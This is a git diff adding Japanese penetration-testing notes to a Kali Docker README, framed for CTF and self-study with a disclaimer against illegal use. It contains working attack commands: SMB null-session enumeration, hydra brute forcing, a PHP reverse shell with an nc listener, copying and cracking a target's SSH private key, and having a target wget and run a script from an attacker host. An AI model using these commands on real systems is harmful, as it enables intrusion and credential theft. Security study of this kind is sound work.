@@ -21,7 +21,11 @@ endif::[]
 
 [CAUTION]
 ====
-悪用厳禁
+KtokKawuは、自衛や検証/CTFのため、ハッキング技術を学習しています。
+自分の管理外の端末や機器(一般に公開されているWebサイトや各種サーバやWi-Fiスポット、他人の端末や機器等)に対し、 +
+非合法な目的で本リポジトリで公開しているツール類やテクニックを使用しないこと。 +
+必ず自己責任の元、ローカル環境やCTF等で攻撃が許可されたサイトに対してのみ使用すること。 +
+KtokKawuは、本リポジトリを利用する他のユーザや企業、団体等が起こした全ての事象に関して一切責任を負いません。
 ====
 
 == Kali Dockerコンテナの作成
@@ -133,3 +137,200 @@ docker inspect --format '{{ .NetworkSettings.IPAddress }}' <C-NAME>
 
 * Windows Firewallの受信規則のうち、パブリックの「com.docker.backend」が有効だと、 +
 リバースシェルを張る時などのインバウンド通信が失敗してしまう。Linuxで構築する場合も同様。
+
+== ハッキング技術メモ
+
+=== port & oss version search(Example:SMB)
+
+----
+https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b
+nmap -sC -p 139,445 -sV 10.10.65.189
+----
+
+=== CVE check
+
+----
+git clone https://github.com/scipag/vulscan scipag_vulscan
+ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan
+nmap -sV -p 22,80,81,82,83,9999 --script=vulscan/vulscan.nse www.example.com 10.10.192.87
+----
+
+=== Login Attack
+
+★そのうち書く
+
+=== Steganography
+
+----
+exiftool nothing.jpg
+binwalk -e nothing.jpg
+foremost nothing.jpg
+steghide extract -sf nothing.jpg -p [password]
+steghide --info nothing.jpg
+----
+
+=== SMB Attack
+
+==== Tools
+
+|===
+|nmblookup|NetBIOS名の検索に使用されるNetBIOS over TCP / IPクライアントを収集
+|smbclient|SMB共有ディレクトリにアクセスするftpのようなクライアント
+|nmap|ポートスキャナ with スクリプト
+|rpcclient|クライアント側のMS-RPC機能を実行するツール
+|enum4linux|さまざまなsmb関数を列挙
+|wireshark|「ntlmssp.ntlmv2_response」でフィルタリングしてNTLMv2のトラフィックからsmbの情報を取得可能
+|===
+
+==== チェックリスト
+
+* ホスト名の確認
++
+----
+# -A オプション：look up by IP address
+nmblookup -A [ip]
+----
++
+* 共有フォルダの一覧
++
+----
+# ホスト上の共有フォルダ一覧とアクセス権を表示
+smbmap -H [ip/hostname] -R
+# SMBからファイルを取得
+smbmap -H [ip/hostname] -R --download '.\Anonymous\staff.txt'
+# 資格情報を取得後に再実行し、新しいアクセス権を表示
+smbmap -H [ip] -d [domain] -u [user] -p [password]
+# nullログインをチェックするため、"exit"は現れる可能性のある全PW要求を処理する
+# -L オプション：指定されたホストの共有のリストを取得します
+echo exit | smbclient -L \\\\[ip]
+# --script smb-enum-shares：特定のsmb列挙スクリプト
+# -p 139,445：smbポートの指定
+nmap --script smb-enum-shares -p 139,445 [ip]
+----
++
+* NULLセッションでの確認
++
+----
+# 資格情報無しで何ができるか確認
+smbmap -H [ip/hostname]
+# 本コマンドの後、RPCコマンドを入力してみる
+# -U ""：NULLセッション
+# -N オプション：PWD無し
+rpcclient -U "" -N [ip]
+# 共有フォルダへの接続試行、空PWDでも行ける可能性有り。
+smbclient \\\\[ip]\\[share name]
+----
++
+* 脆弱性の確認
++
+----
+# --script smb-vuln*：全smb脆弱性スキャンスクリプトを実行
+nmap --script smb-vuln* -p 139,445 [ip]
+----
++
+* SMB全体のスキャン
++
+----
+enum4linux -a [ip]
+----
++
+上記内容の確認で注目する内容は下記。
++
+. nmblookup同様の出力
+. nullセッションのチェック
+. 共有フォルダのリスト
+. ドメイン情報
+. パスワードポリシー
+. RIDサイクリング出力
+* 手操作確認 +
+smbのバージョンを取得するスクリプト
++
+.smbver.sh
+----
+#!/bin/sh
+# Author: rewardone
+# Description:
+#   Requires root or enough permissions to use tcpdump
+#   Will listen for the first 7 packets of a null login and grab the SMB Version
+# Notes:
+#   Will sometimes not capture or will print multiple lines.
+#   May need to run a second time for success.
+# Usage:
+#   smbver.sh [IP] (port) [Samba]
+if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
+if [ ! -z $2 ]; then rport=$2; else rport=139; fi
+tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'aUnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
+echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
+sleep 0.5 && echo ""
+----
++
+上記スクリプトの結果が疑わしい時は、PCAPファイルから、smbバージョンを確認
++
+----
+# 例：Unix Samba 2.2.3a
+check pcap
+----
+
+=== ディレクトリ検査
+
+----
+gobuster -e -u http://A.B.C.D/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s 200,301,302,403,404 -e -x html,php,txt -l -o ./result_gobuster.txt
+----
+
+=== Bruteforce Attack
+
+----
+# -Vオプション：PWDマイニング中に2つのログイン+パスワードを表示
+# -fオプション：指定したPWDが見つかったら停止
+hydra -l [uname] -P ./pwd-list/[pwdtext] [IP] [Protocol] -V -f
+# https://ozuma.hatenablog.jp/entry/20130601/1370094859
+# 効率的には、およそssh(2/s) < ftp(6/s) < http-basic(100/s)の速さ
+----
+
+=== Penetration
+
+==== PHP
+
+----
+vim php-reverse-shell.php # change "$ip" value to [MyHostIP]
+rlwrap nc -lvnp 1234
+# Uploading PRS file & Web Access
+----
+
+==== RSAプライベートキーのクラック
+
+----
+scp target-user@target-IP:/home/target-user2/.ssh/id_rsa /root/
+/usr/share/john/ssh2john.py ./id_rsa > crack
+john --format=SSH --wordlist=./rockyou.txt crack
+john crack --show
+chmod 600 id_rsa
+----
+
+=== Privilege Escalation
+
+==== Scripts
+
+. https://github.com/lucyoa/kernel-exploits
+. https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+. https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack
+. https://github.com/rebootuser/LinEnum
+
+==== 手順
+
+===== LinEnum
+
+----
+# Attacker machine
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+python -m SimpleHTTPServer 1234
+# Target machine
+cd /var/tmp
+/dev/shm
+/var/lock
+/run/lock
+which wget
+wget [MyHostIP]:1234/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+----
